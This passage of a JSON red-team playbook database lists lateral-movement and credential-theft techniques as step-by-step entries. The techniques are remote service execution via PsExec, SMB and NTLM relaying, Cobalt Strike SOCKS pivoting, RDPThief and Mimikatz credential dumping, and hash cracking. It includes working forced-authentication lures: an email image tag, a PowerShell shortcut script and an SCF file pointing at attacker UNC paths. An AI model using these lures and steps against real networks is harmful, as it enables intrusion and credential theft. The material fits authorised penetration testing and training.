                "id": "d225d1d3-fbe1-4b2b-98f9-0dcb50ec17a5",
                "name": "Create Remote Service",
                "description": "Create a new service on the remote machine that points to the uploaded binary using the service control (sc) command.",
                "requirements": {},
                "results": [
                    "SERVICE:CREATED"
                ]
            },
            {
                "id": "0aa8bd02-8c9b-4e0b-b7f3-6ad686a50c81",
                "name": "Start Remote Service",
                "description": "Start the newly created service on the remote machine to execute the payload.",
                "requirements": {},
                "results": [
                    "SERVICE:STARTED",
                    "PROCESS:RUNNING"
                ]
            },
            {
                "id": "3c6a7ebb-ac58-468c-b05a-bac68d2d7273",
                "name": "Stop Remote Service",
                "description": "Stop the running service on the remote machine to prevent the payload from executing any further.",
                "requirements": {},
                "results": [
                    "SERVICE:STOPPED"
                ]
            },
            {
                "id": "60c9f75b-0481-4361-a9de-eb704c49b6b3",
                "name": "Delete Service Binary",
                "description": "Remove the binary file from the ADMIN$ share on the remote machine to clean up traces of the operation.",
                "requirements": {},
                "results": [
                    "FILE:DELETED"
                ]
            }
        ]
    },
    {
        "id": "3cff90c1-567c-4a22-a2f7-127a2ca5873e",
        "name": "SMB Remote Exec",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.006",
        "external": false,
        "description": "Use SMB to gain access to another workstation",
        "content": "Utilize SMB protocol to execute commands or transfer files on a remote system for lateral movement.",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "d0f45eda-6709-4f63-a2b1-ba89b532157c",
                "name": "Check SMB Connectivity",
                "description": "Verify that the target workstation is reachable over SMB by using the 'psexec' command with the test command 'net share'. This step checks the network connectivity and SMB service availability.",
                "requirements": {},
                "results": [
                    "SMB:CONNECT:SUCCESS"
                ]
            },
            {
                "id": "3be41c5f-dc88-477a-a4b7-b792f5b70b89",
                "name": "Enumerate Shares on Target",
                "description": "List the available shares on the target workstation using the 'net view' command or similar tools, indicating points of data that can be accessed.",
                "requirements": {},
                "results": [
                    "SMB:SHARE:ACCESSIBLE"
                ]
            },
            {
                "id": "76b9ceba-0b79-4e60-8f4e-0a7ebc7b24df",
                "name": "Execute Command Remotely",
                "description": "Use 'psexec' or an equivalent command to execute a command on the target machine, testing remote execution capabilities. For example, 'psexec \\target_machine cmd.exe'.",
                "requirements": {},
                "results": [
                    "CMD:EXECUTE:SUCCESS"
                ]
            },
            {
                "id": "5e82bbc3-9e89-42ea-a729-6c0b803d8d5f",
                "name": "Transfer File to Target",
                "description": "Use SMB to upload a file to a share on the target machine using 'copy' or 'psexec' with the 'copy' command. This checks file transfer capabilities over SMB.",
                "requirements": {},
                "results": [
                    "FILE:TRANSFER:SUCCESS"
                ]
            },
            {
                "id": "4a07c3c1-c44f-47f1-b084-87b69ed20b45",
                "name": "Access Target Service",
                "description": "Attempt to start or access a service on the target machine by using 'sc' command. For example, 'sc \\target_machine query'. This tests the ability to interact with services remotely.",
                "requirements": {},
                "results": [
                    "SERVICE:ACCESS:SUCCESS"
                ]
            }
        ]
    },
    {
        "id": "c33f8338-e69c-4ce4-a432-d482686bea32",
        "name": "SMB Relay",
        "phase": "07. Lateral Movement",
        "ttp": "T1557.001",
        "external": false,
        "description": "Relay smb connections to gain access to another workstation",
        "content": "# SMB Relay\n\n## Idea\n1. Attacker selects target\n2. Victim authenticates to attacker\n3. Attacker forwards the authentication attempt to the target\n4. Attacker receives the challenge\n5. Attacker sends back challenge to the victim\n6. Victim sends encrypted challenge to attacker\n7. Attacker sends the challenge and authenticates\n\nNote: this works only if the \u201cNetwork security: LAN Manager authentication level\u201d is set to \u201cSend LM & NTLM responses\u201d or perhaps \u201cNTLMv2 response only\n\n1. Run [[Tools/Responder.md]] to poison LLMNR / SMB / ARP requests\n2. Run [[Tools/smbrelayx.md]] to relay the ticket and drop tools / execute commands on the target server\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "2fe8fc55-415a-4785-b1a1-b574ea646b97",
                "name": "Identify Target Workstation",
                "description": "Ping or scan the network to identify the target workstation's IP address for initiating SMB relay.",
                "requirements": {},
                "results": [
                    "TARGET:IP_ADDRESS"
                ]
            },
            {
                "id": "d9448d6d-3c85-4ef2-b9b1-8a2228fb1dd1",
                "name": "Poison LLMNR/SMB Requests",
                "description": "Run Responder to poison LLMNR or SMB requests on the network, enabling interception of authentication attempts.",
                "requirements": {
                    "tool": "Responder",
                    "environment": "Same local network as target"
                },
                "results": [
                    "LLMNR:POISONED",
                    "SMB:INTERCEPTED_AUTH"
                ]
            },
            {
                "id": "1d087d4a-1e48-4e42-8925-a39e0e85d1bc",
                "name": "Capture Authentication Attempts",
                "description": "Monitor for authentication attempts from the victim via the poisoned SMB or LLMNR responses.",
                "requirements": {
                    "tool": "Responder",
                    "environment": "Same local network as target"
                },
                "results": [
                    "AUTH:CAPTURED"
                ]
            },
            {
                "id": "c1c9b183-b26a-4018-85c5-6ca042b089cc",
                "name": "Relay Authentication to Target",
                "description": "Use smbrelayx to relay the captured authentication attempt to the target workstation, attempting to gain access.",
                "requirements": {
                    "tool": "smbrelayx",
                    "environment": "Same local network as target"
                },
                "results": [
                    "ACCESS:GRANTED",
                    "SESSION:ACTIVE"
                ]
            },
            {
                "id": "b744f7e0-65b6-4f86-a607-4da76b330a3f",
                "name": "Execute Commands on Target Server",
                "description": "With an active session on the target, execute commands to validate access, such as retrieving system information or reversing shells.",
                "requirements": {
                    "tool": "smbrelayx",
                    "environment": "Same local network as target"
                },
                "results": [
                    "COMMAND:EXECUTED",
                    "RESULT:ACCESS_CONFIRMED"
                ]
            }
        ]
    },
    {
        "id": "c7a1afd1-c3a6-4771-bf44-9557775c34cf",
        "name": "WMI",
        "phase": "07. Lateral Movement",
        "ttp": "T1047",
        "external": false,
        "description": "Get Persistence via Teams DLL hijacking",
        "content": "# PowerShell Remoting\n\n## Detection\nWhen binaries are executed via WMI (using process call create), it will be a child of `WmiPrvSE.exe`. So a process create event where **WmiPrvSE** is the parent will be suspicious. This would also be the case if you use WMI to execute a PowerShell one-liner.\n\n>event.module: sysmon and event.type : process_start and process.parent.name : WmiPrvSE.exe\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "aa64efda-4deb-4caf-a3db-5c19844f9c2e",
                "name": "Monitor WMI Event Logs",
                "description": "Check Windows event logs for WMI and related events to detect suspicious activity.",
                "requirements": {},
                "results": [
                    "WMI:SUSPICIOUS_EVENT"
                ]
            },
            {
                "id": "ea6a7b8a-c3e2-4a6a-bc71-a3ecd7ee7cd8",
                "name": "Execute WMI Query",
                "description": "Use a WMI query to execute a script or command and observe if it spawns WmiPrvSE.exe as parent.",
                "requirements": {
                    "tool": "PowerShell",
                    "access": "Administrator"
                },
                "results": [
                    "PROCESSES:WmiPrvSE"
                ]
            },
            {
                "id": "12d0192b-1cf6-45d5-aa3b-cfc77ea6ac3d",
                "name": "Check Parent Process in Sysmon",
                "description": "Review Sysmon logs to find process creation events with WmiPrvSE.exe as the parent process, indicating potential misuse.",
                "requirements": {
                    "tool": "Sysmon",
                    "access": "Log Access"
                },
                "results": [
                    "SYSLOG:WMI_EXECUTION_DETECTED"
                ]
            },
            {
                "id": "e4f2e831-77bf-4a9e-8cbb-f8e5414978a7",
                "name": "Script PowerShell Command Execution",
                "description": "Execute a PowerShell one-liner using WMI and monitor for suspicious outputs and process creation.",
                "requirements": {
                    "tool": "PowerShell",
                    "access": "Administrator"
                },
                "results": [
                    "EXECUTION:POWERSHELL_ONE_LINER"
                ]
            },
            {
                "id": "636fe8b3-5dcf-4897-838b-d1245b6c5011",
                "name": "Identify Child Processes of WmiPrvSE",
                "description": "List child processes of WmiPrvSE.exe to identify potentially malicious actions initiated via WMI.",
                "requirements": {
                    "tool": "Task Manager or PowerShell",
                    "access": "Administrator"
                },
                "results": [
                    "PROCESS:CHILD_OF_WmiPrvSE"
                ]
            }
        ]
    },
    {
        "id": "7560eb03-f96c-4589-ba9c-914161082d8e",
        "name": "Browser",
        "phase": "07. Lateral Movement",
        "ttp": "T1572",
        "external": false,
        "description": "User RDP in order to lateral move to other systems",
        "content": "Firefox plus the FoxyProxy extension or Proxychains, Proxifier is ideal for pivoting a browser into the network, to view internal web applications.",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "b2405ac8-6fa0-4738-933e-1748044ad0ea",
                "name": "Establish RDP Connection",
                "description": "Use the Remote Desktop Protocol (RDP) to connect to a target system within the internal network. Ensure that the target system's RDP service is enabled and accessible.",
                "requirements": {
                    "access": "Valid user credentials for RDP",
                    "environment": "Target system with RDP enabled"
                },
                "results": [
                    "RDP:CONNECTED"
                ]
            },
            {
                "id": "e48c74be-9140-4dce-a088-e512de5c11b5",
                "name": "Install Firefox with FoxyProxy",
                "description": "Download and install the Firefox browser and add the FoxyProxy extension to allow for easy proxy configuration.",
                "requirements": {
                    "tool": "Firefox browser",
                    "access": "Installation rights on the target system"
                },
                "results": [
                    "BROWSER:INSTALLED",
                    "PROXY:CONFIGURED"
                ]
            },
            {
                "id": "c30d6f1b-8d9f-4e7d-a4ed-3c53b1c7c6b1",
                "name": "Configure Proxy Settings",
                "description": "Add the necessary proxy settings in FoxyProxy to redirect traffic through the desired proxy server to facilitate access to internal applications.",
                "requirements": {
                    "access": "Proxy server details"
                },
                "results": [
                    "PROXY:SETTINGS_APPLIED"
                ]
            },
            {
                "id": "cdaaeaf9-4c14-4091-b2d4-b6609af1f2b5",
                "name": "Access Internal Web Applications",
                "description": "Use the configured Firefox browser to navigate to internal web applications that are only accessible through the proxy set up in the previous step.",
                "requirements": {
                    "access": "Valid URLs of internal applications"
                },
                "results": [
                    "APP:ACCESS_GRANTED",
                    "APP:DATA_RETRIEVED"
                ]
            },
            {
                "id": "ccdfc8e4-2f86-4ac4-83e1-2963e3069b6e",
                "name": "Log Network Traffic",
                "description": "Monitor and log network traffic to understand the data flow between the local machine and the internal applications accessed via the proxy.",
                "requirements": {
                    "tool": "Network monitoring tool"
                },
                "results": [
                    "NET:TRAFFIC_LOGGED"
                ]
            }
        ]
    },
    {
        "id": "b9f95335-e93c-49a3-ad68-463bb48ae1c3",
        "name": "NTLM Relaying",
        "phase": "07. Lateral Movement",
        "ttp": "T1557.001",
        "external": false,
        "description": "NoDescription",
        "content": "# NTLM Relaying\nNTLM authentication uses a 3-way handshake between a client and server. The high-level steps are as follows:\n1.  The client makes an authentication request to a server for a resource it wants to access.\n2.  The server sends a challenge to the client, whereas the challenge is using the hash of the users password.\n3.  The client sends the encrypted response to the server, which contacts a domain controller to verify the encrypted challenge is correct.\n\nIn an NTLM relay attack, an attacker is able to intercept or capture this authentication traffic and effectively allows them to impersonate the client against the same, or another service.\n\nAn example:  \nA client attempts to connect to an SQL server, but the attacker monitors the authentication mechanism and impersonates/replays the handshake, to connect to the CIFS service as he was the client.\n\nIn case a linux host is available tools like\n* [[Responder]]\n* [[ntlmrelayx]]\n\ncan be used.\n\nBut on Windows port 445 is always in use so the SMB port needs to be bended by [[PortBender]] which will be reflective injected.\n\n\u26a0\ufe0fThis pretty much breaks any SMB service on the machine.\n\n#opsec: The loaded driver will be located in the current working directory of the Beacon so choose `C:\\Windows\\System32\\drivers` before you run.  \n\n\n## Force Authentication\nIf you don't have the possibilities to fetch a request try some force authentication methods as shown below.\n\n### 1x1 Images in Emails\nSend emails with an invisible 1x1 image embedded in the mail. When being viewed the email client will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.\n`<img src=\"\\\\10.10.10.21\\test.ico\" height=\"1\" width=\"1\" />`\n\n### Windows Shortcuts\nThe icon property of the Windows shortcut (.lnk) can can be used by pointing it to an UNC path which will trigger an NTLM authentication attempt just by being viewed.\n\nThe easiest way to create a shortcut is with PowerShell.\n``````powershell\n$wsh = new-object -ComObject wscript.shell\n$shortcut = $wsh.CreateShortcut(\"\\\\dc1\\share\\test.lnk\")\n$shortcut.IconLocation = \"\\\\10.10.10.21\\test.ico\"\n$shortcut.Save()\n``````\n\n### SCF file\nSCF (Shell Command Files) files can be used to access a specific UNC path. Paste the code below into a text file and store it on a network share.\n``````@log.scf\n[Shell]\nCommand=``2\nIconFile=\\\\X.X.X.X\\share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n``````\n\n## Tools\n########\n########",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [],
        "tools": [
            "InveighZero",
            "MultiRelay",
            "ntlmrelayx",
            "PortBender",
            "PrintSpooler",
            "Responder",
            "SharpSystemTriggers",
            "smbrelayx"
        ],
        "steps": [
            {
                "id": "efa5da7c-cf5b-4aa4-997b-a3f1c46d3315",
                "name": "Send 1x1 Image in Email",
                "description": "Embed a 1x1 image in an email to force an NTLM authentication attempt when the recipient views the email.",
                "requirements": {},
                "results": [
                    "NTLM:AUTH"
                ]
            },
            {
                "id": "bcf26e92-f941-469c-a0b4-1b53801d9a5c",
                "name": "Create Windows Shortcut for UNC Path",
                "description": "Create a Windows shortcut (.lnk) that points to a UNC path to trigger NTLM authentication when viewed.",
                "requirements": {
                    "PowerShell": {}
                },
                "results": [
                    "NTLM:AUTH"
                ]
            },
            {
                "id": "e58f60ec-aeab-4e03-9a01-dc6f15828d4f",
                "name": "Create SCF File for UNC Path",
                "description": "Create an SCF file that triggers an NTLM authentication attempt when accessed.",
                "requirements": {},
                "results": [
                    "NTLM:AUTH"
                ]
            },
            {
                "id": "62f9ba31-509e-4929-a024-1e9ad0094e45",
                "name": "Run InveighZero",
                "description": "Run InveighZero to capture NetNTLM hashes on a local admin account, ignoring uncrackable accounts.",
                "requirements": {
                    "InveighZero": {},
                    "Admin Privileges": {}
                },
                "results": [
                    "CRED:HASH"
                ]
            },
            {
                "id": "c8e7cd97-8be1-461a-ab5a-5c8675bc135d",
                "name": "Execute ntlmrelayx",
                "description": "Run ntlmrelayx to capture NTLM authentication and perform actions like dumping the local SAM hashes.",
                "requirements": {
                    "ntlmrelayx": {},
                    "Proxychains": {}
                },
                "results": [
                    "CRED:HASH"
                ]
            },
            {
                "id": "05484743-6943-447d-bb74-95f7848f6169",
                "name": "Setup PortBender",
                "description": "Use PortBender to redirect SMB communications and facilitate NTLM relaying.",
                "requirements": {
                    "PortBender": {},
                    "Admin Privileges": {}
                },
                "results": [
                    "CRED:HASH"
                ]
            },
            {
                "id": "92539c6a-e381-4d87-bd77-1d60764b2e85",
                "name": "Start Responder",
                "description": "Configure and run Responder to answer to all LLMNR requests and capture NTLM authentication.",
                "requirements": {
                    "Responder": {}
                },
                "results": [
                    "CRED:HASH"
                ]
            },
            {
                "id": "394dd701-0af4-45df-8f8b-37a7b8ab3bf0",
                "name": "Run smbrelayx",
                "description": "Execute smbrelayx on the target to relay SMB authentication and perform actions using the captured credentials.",
                "requirements": {
                    "smbrelayx": {}
                },
                "results": [
                    "CRED:HASH"
                ]
            }
        ]
    },
    {
        "id": "69894386-19d7-4707-a914-42e82ae6f95d",
        "name": "RDP",
        "phase": "07. Lateral Movement",
        "ttp": "T1021.001",
        "external": false,
        "description": "User RDP in order to lateral move to other systems",
        "content": "## Tools\n########\n########",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [
            "\n## [[FreeRDP]]\n```bash\nxfreerdp /u:user /p:yGWrFM9jn37K /v:pc.testdomain.local\n```\n\n# Resources\n[https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown](https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/Free[[NMAP]]",
            "\n## [[PowerShell]]\n`Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-TerminalServices-RDPClient/Operational'; id='1024' } | select timecreated, message | ft -AutoSize -Wrap`",
            "\n## [[RDPThief]]\n* https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/\n* https://github.com/passthehashbrowns/SharpRDPThief"
        ],
        "tools": [
            "FreeRDP",
            "PowerShell",
            "RDPThief"
        ],
        "steps": [
            {
                "id": "9e4bde4e-bdc6-4790-9e00-3f4b49b1cf98",
                "name": "Connect to target RDP host using FreeRDP",
                "description": "Use FreeRDP to connect to a remote host. This simulates lateral movement by using Remote Desktop Protocol.",
                "requirements": {},
                "results": [
                    "RDP:CONN"
                ]
            },
            {
                "id": "c56a248b-469b-4d2b-911d-eafe5a61a1cb",
                "name": "Check RDP Connection Logs using PowerShell",
                "description": "Retrieve RDP connection logs from the event log to verify successful connections and review timestamps.",
                "requirements": {},
                "results": [
                    "RDP:LOG",
                    "EVENT:1024"
                ]
            },
            {
                "id": "abb291b4-686f-474f-8b59-7bc5e32c2aac",
                "name": "Extract RDP Credentials with RDPThief",
                "description": "Run RDPThief to extract clear-text credentials stored in RDP clients that can be used for lateral movement.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "f62214e8-fdd0-46dc-b5cb-1fe0e14c8d37",
        "name": "Reverse Port Forward",
        "phase": "07. Lateral Movement",
        "ttp": "T1572",
        "external": false,
        "description": "NoDescription",
        "content": "# Reverse Port Forward\nReverse Port Forwarding allows a machine to redirect incoming traffic to a specified IP and port.\n\n## Windows\nThere are two main ways to create a reverse port forward:\n1.  Windows `netsh`.\n2.  Reverse port forward capability built into the C2 framework.\n\n## Cobalt Strike\nHas two functions which do the job:\n- rportfwd\n- rportfwd_local\n\n\n## Tools\n########\n########",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [],
        "tools": [
            "netsh"
        ],
        "steps": [
            {
                "id": "1d62fe64-0cb4-49e3-982b-de369ffbcdf9",
                "name": "Add Port Proxy",
                "description": "Create a new port proxy that listens on a specified address and port, and forwards traffic to a designated IP and port using the 'netsh' command.",
                "requirements": {},
                "results": [
                    "NETSH:PROXY:ADDED"
                ]
            },
            {
                "id": "b1b9039e-f5ec-4150-9b75-6443a505fb5b",
                "name": "Show Port Proxies",
                "description": "Verify the existing port proxies by listing all configured port forwarding rules using the 'netsh interface portproxy show' command.",
                "requirements": {},
                "results": [
                    "NETSH:PROXY:LISTED"
                ]
            },
            {
                "id": "8a474574-8043-4574-99cc-d165ec75ac96",
                "name": "Test Port Proxy",
                "description": "Test if the port proxy is working by listening on the target port and confirming that a connection can be established from another machine using PowerShell.",
                "requirements": {},
                "results": [
                    "TEST:CONNECTION:SUCCESS"
                ]
            },
            {
                "id": "24f3f7f2-f447-4094-b4d9-d966c5eab5f7",
                "name": "Delete Port Proxy",
                "description": "Remove the specified port proxy that was previously created using the 'netsh' command.",
                "requirements": {},
                "results": [
                    "NETSH:PROXY:REMOVED"
                ]
            }
        ]
    },
    {
        "id": "54a18071-811d-4f08-8e43-07f3cca11a93",
        "name": "SOCKS Proxy",
        "phase": "07. Lateral Movement",
        "ttp": "T1572",
        "external": false,
        "description": "NoDescription",
        "content": "# Socks Proxy\n\n## Setup SOCKS via Cobalt Strike\n``````beacon\nbeacon> socks 1080\n[+] started SOCKS4a server on: 1080\n``````\n\nThis will bind port 1080 on the Team Server.\n``````bash\nroot@kali:~# ss -lpnt\nState   Recv-Q  Send-Q  Local Address:Port Peer Address:Port    Process\nLISTEN  0       128     .:1080             .:*                  users:((\"java\",pid=1222,fd=11))\n``````\n\n#opsec This binds 1080 on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone.\nAlways ensure your Team Server is adequately protected and never exposed directly to the Internet.\n\n## Tunnel Windows\nWe can tunnel GUI apps that run on Windows using a proxy client such as [[Proxifier]].\n\n### RunAs\nSome applications (such as the RSAT tools) don't provide a means of providing a username or password, because they're designed to use a user's domain context. You can still run these tools on your attacking machine. If you have the clear text credentials, use `runas /netonly`.\n\n``````powershell\nC:\\>runas /netonly /user:EDU\\patrick \"C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc\"\nEnter the password for EDU\\patrick:\nAttempting to start C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc as user \"EDU\\patrick\" ...\n``````\n\n### Mimikatz\nYou can use [[Mimikatz#Spawn process with injected credentials]] - [[Pass-the-Hash]]\n\n\n## Tools\n########\n########",
        "category": "Pivoting",
        "stealthy": false,
        "changes": [
            "\n## [[NMAP]]\nNmap example via proxychains:\n``````sh\nproxychains nmap -n -Pn -sT -p445,3389,5985 10.10.1.20\n``````\n\u26a0\ufe0fICMP and SYN scans cannot be tunnelled, so we must disable ping discovery (`-Pn`) and specify TCP scans (`-sT`) for this to work",
            "\n## [[Proxifier]]\n#opsec You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.\n\nOpen **Proxifier**, go to **Profile > Proxy Servers** and **Add** a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/proxy-servers.png)\n\nNext, go to **Profile > Proxification Rules**. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for **adexplorer64.exe** (part of the Sysinternals Suite). When this application tries to connect to a target host within the **10.10.17.0/24** subnet (**edu.evil.corp**), it will be automatically proxied through the Cobalt Strike proxy server defined above.\n\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/proxy-rule.png)\n\nNow launch ADExplorer and connect to **10.10.17.71** (DC-2).\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/ad-connect.png)\n\nYou will then see the traffic being proxied in Proxifier, and ADExplorer connects successfully.\n![](https://rto-assets.s3.eu-west-2.amazonaws.com/socks/adexplorer.png)",
            "\n## [[Proxychains]]\n1. Change configuration:\n   ```bash\n    nano /etc/proxychains.conf\n    - comment out the last line\n    + Socks5 127.0.0.1 8080\n    ```\n2. Use proxychains:\n    `proxychains4 nmap -sT -p- 10.0.0.0/24`",
            "\n## [[WMIexec]]\n``````sh\nproxychains python3 /usr/local/bin/wmiexec.py EDU/john@10.10.1.20\n``````"
        ],
        "tools": [
            "NMAP",
            "Proxifier",
            "Proxychains",
            "WMIexec"
        ],
        "steps": [
            {
                "id": "f4d85afa-daa0-49c8-b277-f42e9496012a",
                "name": "Start SOCKS Proxy",
                "description": "Initialize a SOCKS4a server on port 1080 on the Team Server using Cobalt Strike.",
                "requirements": {
                    "tool": "Cobalt Strike",
                    "access": "Team Server"
                },
                "results": [
                    "SOCKS:RUNNING",
                    "SOCKS:PORT_1080_READY"
                ]
            },
            {
                "id": "6ccca0f4-e29b-4142-a4f5-0819b54f6f98",
                "name": "Verify SOCKS Proxy is Listening",
                "description": "Check that the SOCKS proxy is listening on the specified port using the ss command.",
                "requirements": {
                    "tool": "ss",
                    "access": "Team Server Shell"
                },
                "results": [
                    "SOCKS:LISTENING",
                    "SOCKS:PORT_1080_ACTIVE"
                ]
            },
            {
                "id": "98d5017d-ae7f-4de8-b85e-d16385e23e38",
                "name": "Configure Proxifier",
                "description": "Add a new proxy entry in Proxifier pointing to the SOCKS proxy (127.0.0.1:1080).",
                "requirements": {
                    "tool": "Proxifier",
                    "access": "User Environment"
                },
                "results": [
                    "PROXIFIER:PROXY_CONFIGURED"
                ]
            },
            {
                "id": "f34a1495-90d4-41b3-a8ea-cb0c9fea4bfe",
                "name": "Create Proxification Rule for AD Explorer",
                "description": "Set up a proxification rule in Proxifier for adexplorer64.exe to use the SOCKS proxy.",
                "requirements": {
                    "tool": "Proxifier",
                    "access": "User Environment"
                },
                "results": [
                    "PROXIFIER:RULE_AD_EXPLORER_CREATED"
                ]
            },
            {
                "id": "72dc9f68-e537-49b5-96c0-e4699de35a5f",
                "name": "Run AD Explorer Through Proxy",
                "description": "Launch adexplorer64.exe to connect to a target host (e.g., 10.10.17.71) with the proxy settings applied.",
                "requirements": {
                    "tool": "Proxifier",
                    "access": "User Environment"
                },
                "results": [
                    "APP:CONNECTED",
                    "TRAFFIC:PROXIED"
                ]
            },
            {
                "id": "6a65faef-a185-4dd4-91d6-e7b1c7fd6a2f",
                "name": "Run Nmap via Proxychains",
                "description": "Execute an Nmap scan through the SOCKS proxy by using Proxychains to specify the proxy settings.",
                "requirements": {
                    "tool": "proxychains",
                    "access": "User Environment"
                },
                "results": [
                    "SCAN:SUCCESS",
                    "SCAN:RESULTS_RETRIEVED"
                ]
            },
            {
                "id": "c193fbc5-5d2b-4754-94b2-bb8d778d4e96",
                "name": "Run WMIexec via Proxychains",
                "description": "Run the WMIexec.py script through Proxychains to execute commands on the remote system using the proxy.",
                "requirements": {
                    "tool": "proxychains",
                    "access": "User Environment"
                },
                "results": [
                    "WMI:EXECUTION_SUCCESS",
                    "COMMAND:RUN"
                ]
            }
        ]
    },
    {
        "id": "5c704518-7314-4972-a66a-9e0914a2d7af",
        "name": "Cached Domain Credentials",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1003.005",
        "external": false,
        "description": "Cached Domain Credentials were designed for instances where domain credentials are required to logon to a machine, even whilst offline.",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Mimikatz]]\nUnfortunately, the hash format is not NTLM.\n\nTo crack these with [[Hashcat]], we need to transform them into the expected format. The [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us it should be `$DCC2$<iterations>#<username>#<MsCacheV2hash>`."
        ],
        "tools": [
            "Mimikatz"
        ],
        "steps": [
            {
                "id": "b5c81a39-63ae-4732-b0f8-bd6f119963e9",
                "name": "Dump Cached Credentials",
                "description": "Use Mimikatz to dump cached domain credentials from the Local Security Authority (LSA) to extract credentials of logged-in users.",
                "requirements": {
                    "tool": "Mimikatz",
                    "access": "Administrator privileges",
                    "environment": "Windows with LSA access"
                },
                "results": [
                    "CRED:USERNAME",
                    "CRED:HASH"
                ]
            },
            {
                "id": "f56c908b-12e4-418b-9851-9a428d4b7829",
                "name": "Identify Hash Format",
                "description": "Ensure that the dumped credentials are in the correct format for cracking. Use the output from Mimikatz to confirm the format and identify relevant details such as username and MsCacheV2 hash.",
                "requirements": {
                    "tool": "Mimikatz",
                    "access": "Access to Mimikatz output"
                },
                "results": [
                    "FORMAT: DCC2",
                    "CRED:USERNAME",
                    "CRED:MSCACHEV2HASH"
                ]
            },
            {
                "id": "b47e4dac-8e3a-4440-81cf-a7a3b395cbf3",
                "name": "Prepare Hash for Hashcat",
                "description": "Transform the output from Mimikatz into the required format for Hashcat, ensuring the format is $DCC2$<iterations>#<username>#<MsCacheV2hash>.",
                "requirements": {
                    "tool": "Hashcat",
                    "access": "WSL or command line access to prepare hash strings"
                },
                "results": [
                    "HASH:PREPARED"
                ]
            },
            {
                "id": "e0caab94-0817-41e7-8f8f-1bbf5c2dfae9",
                "name": "Crack Cached Credentials",
                "description": "Use Hashcat to crack the prepared cached domain credentials against a dictionary or brute-force method to retrieve plaintext passwords.",
                "requirements": {
                    "tool": "Hashcat",
                    "access": "Access to a cracking wordlist or rules"
                },
                "results": [
                    "CRED:PASS"
                ]
            }
        ]
    },
    {
        "id": "d0287ca0-5103-4aaf-9eb4-0af85d656dc8",
        "name": "Crack Credentials",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1110",
        "external": false,
        "description": "Cracking different hashes to recover the password in the plaintext format.",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Hashcat",
            "John the Ripper"
        ],
        "steps": [
            {
                "id": "1b81b4ec-461e-43ec-8fea-54241090d163",
                "name": "Crack NTLM Hash with Hashcat",
                "description": "Use Hashcat to crack NTLM hashes found in 'ntlm.txt' using a wordlist located at 'D:\\Tools\\rockyou.txt'. The result is stored in 'C:\\Temp\\ntlm.txt'.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "c7d62d8c-56ad-4c03-a6ac-0ac80651751e",
                "name": "Crack krb5tgs with Hashcat",
                "description": "Use Hashcat to crack krb5tgs hashes found in 'ntlm.txt' using the same wordlist located at 'D:\\Tools\\rockyou.txt'. Results will be stored in 'C:\\Temp\\ntlm.txt'.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "e5e7ec8c-b3a1-4d76-b968-99d4c7b2e1d2",
                "name": "Crack krb5asrep with Hashcat",
                "description": "Use Hashcat to crack krb5asrep hashes found in 'ntlm.txt' utilizing the wordlist located at 'D:\\Tools\\rockyou.txt'. Results saved in 'C:\\Temp\\ntlm.txt'.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "7e74462a-6c52-4e00-b26a-18d36b5f5e3c",
                "name": "Crack netntlmv2 with Hashcat",
                "description": "Use Hashcat to crack netntlmv2 hashes located in 'ntlm.txt' using the wordlist at 'D:\\Tools\\rockyou.txt'. Store output in 'C:\\Temp\\ntlm.txt'.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            },
            {
                "id": "f0da8b83-32e6-4e5d-9b3a-85d5274816c0",
                "name": "Crack netntlmv2 with John the Ripper",
                "description": "Use John the Ripper to crack netntlmv2 hashes contained in 'svc_mssql-netntlmv2' using a specified wordlist.",
                "requirements": {},
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "74baeff6-47ad-418a-be6a-01078da21066",
        "name": "Credential Prompt",
        "phase": "08. Credentials & User Impersonation",
        "ttp": "T1056.002",
        "external": false,
        "description": "Creating a fake credential prompt could lead to the recovery of plaintext credentials",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "e3ec854e-d8b0-4635-a917-3f59e320f0e9",
                "name": "Create Fake Credential Prompt",
